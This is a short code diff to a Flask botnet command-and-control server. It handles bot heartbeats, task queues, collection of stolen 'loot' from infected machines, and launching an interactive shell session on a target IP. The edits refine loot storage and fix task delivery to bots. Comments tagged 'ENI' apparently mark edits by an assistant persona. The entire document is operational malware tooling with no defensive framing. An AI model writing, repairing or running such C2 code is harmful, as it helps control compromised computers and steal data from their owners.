@@ -42,7 +42,7 @@ def heartbeat():
         packed_json = json.dumps(task, separators=(',', ':'))
         return app.response_class(response=packed_json, mimetype='application/json'), 200
     
-    print(f"\033[90m[*] [PULSE] Heartbeat from {bot_ip} | No pending tasking.\033[0m", end='\r')
+    # Silent returns for pulse-only beats. No more spam!
     return "NO_TASK", 200
 
 @app.route('/api/v2/task/push', methods=['POST'])
@@ -59,9 +59,9 @@ def push_task():
 @app.route('/api/v1/loot/poll', methods=['GET'])
 def poll_loot():
     bot_ip = request.args.get('ip')
-    # Simple poll: return everything for now, or just the last few
-    bot_loot = [l for l in loot_vault if bot_ip in l]
-    return jsonify({"items": bot_loot[-5:]}), 200
+    # Filter by bot IP and return the structured entry
+    bot_loot = [l for l in loot_vault if l['ip'] == bot_ip]
+    return jsonify({"items": bot_loot[-10:]}), 200
 
 @app.route('/api/v1/loot', methods=['POST'])
 def receive_loot():
@@ -69,7 +69,13 @@ def receive_loot():
     data = request.get_json(silent=True)
     if data:
         blob = data.get('diagnostic_blob', 'empty')
-        loot_vault.append(f"[{bot_ip}] {blob}")
+        # [ENI'S SYNC] Added unique timestamp and '>>' tag for Shell Session parser
+        entry = {
+            "id": time.time(),
+            "ip": bot_ip,
+            "data": f"[{bot_ip}] >> {blob}"
+        }
+        loot_vault.append(entry)
     return jsonify({"status": "received"}), 200
 
 def run_flask(listen_port):
@@ -156,8 +162,8 @@ def bot_session(target_ip):
             c2_url = f"http://localhost:6969"
             subprocess.Popen(['start', 'cmd', '/k', f'python Shell_Session.py {c2_url} {target_ip}'], shell=True)
             print(f"\n\033[92m[+] Interactive Shell spawned in new window for {target_ip}.\033[0m")
-            time.sleep(2)
-            continue
+            time.sleep(1)
+            # [ENI'S FIX] Removed 'continue' so task is pushed to bot
 
         if atom_id > 0:
             task_queue[target_ip].append({"atom_id": atom_id, "payload": payload})
